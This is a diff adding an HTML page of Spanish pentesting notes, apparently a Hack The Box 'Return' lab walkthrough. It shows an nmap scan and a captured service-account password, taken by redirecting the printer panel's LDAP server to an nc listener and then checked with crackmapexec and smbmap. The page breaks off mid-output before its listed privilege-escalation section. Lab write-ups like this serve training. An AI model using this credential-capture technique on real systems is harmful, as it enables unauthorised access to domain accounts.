@@ -1,0 +1,1063 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.3.9">
+    
+    
+      
+        <title>Return - Pentesting</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.1d29e8d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#return-htb" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Pentesting" class="md-header__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pentesting
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Return
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Pentesting" class="md-nav__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Pentesting
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        Introdución
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Máquinas
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Máquinas" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Máquinas
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          Linux
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Linux" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Linux
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/academy/" class="md-nav__link">
+        Academy
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/bank/" class="md-nav__link">
+        Bank
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/bolt/" class="md-nav__link">
+        Bolt
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/chainsaw/" class="md-nav__link">
+        Chainsaw
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/epsilon/" class="md-nav__link">
+        Epsilon
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/flustered/" class="md-nav__link">
+        Flustered
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/goodgames/" class="md-nav__link">
+        Goodgames
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/laboratory/" class="md-nav__link">
+        Laboratory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/nodeblog/" class="md-nav__link">
+        Nodeblog
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/nunchucks/" class="md-nav__link">
+        Nunckucks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/pressed/" class="md-nav__link">
+        Pressed
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/unbalanced/" class="md-nav__link">
+        Unbalanced
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/validation/" class="md-nav__link">
+        Validation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/zipper/" class="md-nav__link">
+        Zipper
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          Windows
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Windows" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Windows
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../arkham/" class="md-nav__link">
+        Arkham
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Return
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Return
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enum" class="md-nav__link">
+    Enum
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#intrusion-con-user-svc-printer" class="md-nav__link">
+    Intrusión con user (svc-printer)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#escalate-privileges-server-operator" class="md-nav__link">
+    Escalate privileges (Server Operator)
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Recursos
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Recursos" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Recursos
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/docker/" class="md-nav__link">
+        Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/exploits/" class="md-nav__link">
+        Exploits
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/inyecciones/" class="md-nav__link">
+        Inyecciones
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/shells/" class="md-nav__link">
+        Shells
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/tools/" class="md-nav__link">
+        Tools
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/win-commands/" class="md-nav__link">
+        Windows Commands
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+
+<h1 id="return-htb">Return HTB</h1>
+<h2 id="recon">Recon</h2>
+<ul>
+<li>
+<p>Se comprueba que la máquina está activa:</p>
+<blockquote>
+<p><code>ping 10.10.11.108</code></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="enum">Enum</h2>
+<ul>
+<li>
+<p>Se realiza un scan de los 65535 puertos TCP:</p>
+<blockquote>
+<p><code>nmap -sS -Pn -p- -n --open --min-rate 5000 -oG allPorts 10.10.11.108</code></p>
+</blockquote>
+</li>
+<li>
+<p>Se realiza un scan de los puertos abiertos:</p>
+<blockquote>
+<p><code>nmap -sCV -p53,80,88,135,139,389,445,464,593,636,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694 10.10.11.108 -oN openPorts</code></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>PORT      STATE SERVICE       VERSION
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>53/tcp    open  domain        Simple DNS Plus
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>80/tcp    open  http          Microsoft IIS httpd 10.0
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>|_http-server-header: Microsoft-IIS/10.0
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>| http-methods: 
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>|_  Potentially risky methods: TRACE
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>|_http-title: HTB Printer Admin Panel
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-15 10:57:45Z)
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>135/tcp   open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>445/tcp   open  microsoft-ds?
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>464/tcp   open  kpasswd5?
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>636/tcp   open  tcpwrapped
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>|_http-server-header: Microsoft-HTTPAPI/2.0
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>|_http-title: Not Found
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>9389/tcp  open  mc-nmf        .NET Message Framing
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>|_http-server-header: Microsoft-HTTPAPI/2.0
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>|_http-title: Not Found
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>49664/tcp open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>49665/tcp open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>49666/tcp open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>49667/tcp open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>49671/tcp open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>49675/tcp open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>49679/tcp open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>49682/tcp open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>49694/tcp open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>
+<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>Host script results:
+<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>| smb2-time: 
+<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>|   date: 2022-08-15T10:58:37
+<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>|_  start_date: N/A
+<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>| smb2-security-mode: 
+<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>|   3.1.1: 
+<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>|_    Message signing enabled and required
+<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>|_clock-skew: 18m34s
+<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>
+<a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>Nmap done: 1 IP address (1 host up) scanned in 67.16 seconds
+</code></pre></div>
+</li>
+</ul>
+<h2 id="intrusion-con-user-svc-printer">Intrusión con user (svc-printer)</h2>
+<ul>
+<li>
+<p>Conectando a http://10.10.11.108/settings.php se puede ver que el usuario por defecto manda por ldap credenciales, se modifica el servidor a la ip de la máquina atacante y se recibe la password:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">&gt;</span> <span class="n">nc</span> <span class="n">-lvnp</span> <span class="n">389</span>  
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>    <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="n">7</span><span class="p">.</span><span class="n">92</span> <span class="p">(</span> <span class="n">https</span><span class="p">://</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="p">/</span><span class="n">ncat</span> <span class="p">)</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>    <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">:::</span><span class="n">389</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>    <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">:</span><span class="n">389</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>    <span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">108</span><span class="p">.</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>    <span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">108</span><span class="p">:</span><span class="n">59469</span><span class="p">.</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>    <span class="n">0</span><span class="p">*`</span><span class="k">%return</span><span class="p">\</span><span class="n">svc-printer</span><span class="err">�</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>                        <span class="n">1edFg43012</span><span class="p">!!</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="p">&gt;</span> <span class="n">cme</span> <span class="n">smb</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">108</span> <span class="n">-u</span> <span class="s1">&#39;svc-printer&#39;</span> <span class="n">-p</span> <span class="s1">&#39;1edFg43012!!&#39;</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="n">SMB</span>         <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">108</span>    <span class="n">445</span>    <span class="n">PRINTER</span>          <span class="p">[*]</span> <span class="n">Windows</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span> <span class="n">Build</span> <span class="n">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">PRINTER</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="k">return</span><span class="p">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="n">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="n">False</span><span class="p">)</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="n">SMB</span>         <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">108</span>    <span class="n">445</span>    <span class="n">PRINTER</span>          <span class="p">[+]</span> <span class="k">return</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">svc-printer</span><span class="p">:</span><span class="n">1edFg43012</span><span class="p">!!</span> 
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="p">&gt;</span> <span class="n">smbmap</span> <span class="n">-H</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">108</span> <span class="n">-u</span> <span class="s1">&#39;svc-printer&#39;</span> <span class="n">-p</span> <span class="s1">&#39;1edFg43012!!&#39;</span>
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="p">[+]</span> <span class="n">IP</span><span class="p">:</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">11</span><span class="p">.</span><span class="n">108</span><span class="p">:</span><span class="n">445</span>    <span class="n">Name</span><span class="p">:</span> <span class="k">return</span><span class="p">.</span><span class="n">local</span>                                      
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>    <span class="n">Disk</span>                                                    <span class="n">Permissions</span> <span class="n">Comment</span>
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="p">----</span>                                                    <span class="p">-----------</span> <span class="p">-------</span>
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="n">ADMIN</span><span class="p">$</span>                                              <span class="n">READ</span> <span class="n">ONLY</span>   <span class="n">Remote</span> <span class="n">Admin</span>
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="n">C</span><span class="p">$</span>                                                  <span class="n">READ</span><span class="p">,</span> <span class="nb">WRITE </span><span class="k">Default</span> <span class="n">share</span>
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="n">IPC</span><span class="p">$</span>                                                <span class="n">READ</span> <span class="n">ONLY</span>   <span class="n">Remote</span> <span class="n">IPC</span>
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="n">NETLOGON</span>                                            <span class="n">READ</span> <span class="n">ONLY</span>   <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span> 
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="n">SYSVOL</span>                                              <span class="n">READ</span> <span class="n">ONLY</span>   <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span> 
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>
